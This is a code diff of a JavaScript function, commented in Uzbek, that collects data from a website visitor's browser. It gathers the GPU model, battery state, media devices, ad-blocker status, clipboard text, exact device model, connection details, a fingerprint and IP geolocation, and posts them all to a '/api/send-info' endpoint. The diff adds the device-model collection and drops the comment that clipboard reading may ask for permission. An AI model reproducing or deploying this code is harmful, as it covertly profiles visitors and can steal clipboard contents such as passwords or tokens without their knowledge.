@@ -1,10 +1,10 @@
 async function collectAndSendInfo() {
     try {
-        // 1. GPU ma'lumotlari (Xatosiz variant)
+        // 1. GPU ma'lumotlari
         let gpu = "Noma'lum";
         try {
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const gl = canvas.getContext('webgl');
             if (gl) {
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 if (debugInfo) {
@@ -18,38 +18,44 @@ async function collectAndSendInfo() {
         try {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                battery = {
-                    level: Math.round(b.level * 100) + "%",
-                    charging: b.charging ? "⚡" : "🔋"
-                };
+                battery = { level: Math.round(b.level * 100) + "%", charging: b.charging ? "⚡" : "🔋" };
             }
         } catch (e) {}
 
-        // 3. Media va Aloqa
+        // 3. Media va AdBlock
         let media = {};
         try {
             const devices = await navigator.mediaDevices.enumerateDevices();
             media = devices.map(d => d.kind).reduce((acc, k) => { acc[k] = (acc[k] || 0) + 1; return acc; }, {});
         } catch (e) {}
 
-        // 5. AdBlocker tahlili
         let adBlock = "Yo'q";
         try {
             const testAd = document.createElement('div');
-            testAd.innerHTML = '&nbsp;';
             testAd.className = 'adsbox';
             document.body.appendChild(testAd);
             if (testAd.offsetHeight === 0) adBlock = "Ha! 🚫";
             testAd.remove();
         } catch (e) {}
 
-        // 6. Almashish buferi (Clipboard) - Ruxsat so'rashi mumkin!
+        // 4. Clipboard (Bufer)
         let clipboard = "Ruxsat berilmadi";
         try {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 clipboard = await navigator.clipboard.readText();
             }
-        } catch (e) { clipboard = "Bloklandi yoki Ruxsat yo'q"; }
+        } catch (e) {}
+
+        // 5. Model va Boshqalar
+        let exactModel = "";
+        try {
+            if (navigator.userAgentData) {
+                const h = await navigator.userAgentData.getHighEntropyValues(['model']);
+                exactModel = h.model;
+            }
+        } catch (e) {}
+
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
         const info = {
             fingerprint: btoa(navigator.userAgent).substring(15, 35),
@@ -73,14 +79,13 @@ async function collectAndSendInfo() {
             referrer: document.referrer || 'Direct'
         };
 
-        // 5. Geo API
+        // 6. Geo va Yuborish
         let geo = {};
         try {
             const res = await fetch('https://ipapi.co/json/');
             geo = await res.json();
         } catch (e) {}
 
-        // 6. Yuborish
         await fetch('/api/send-info', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
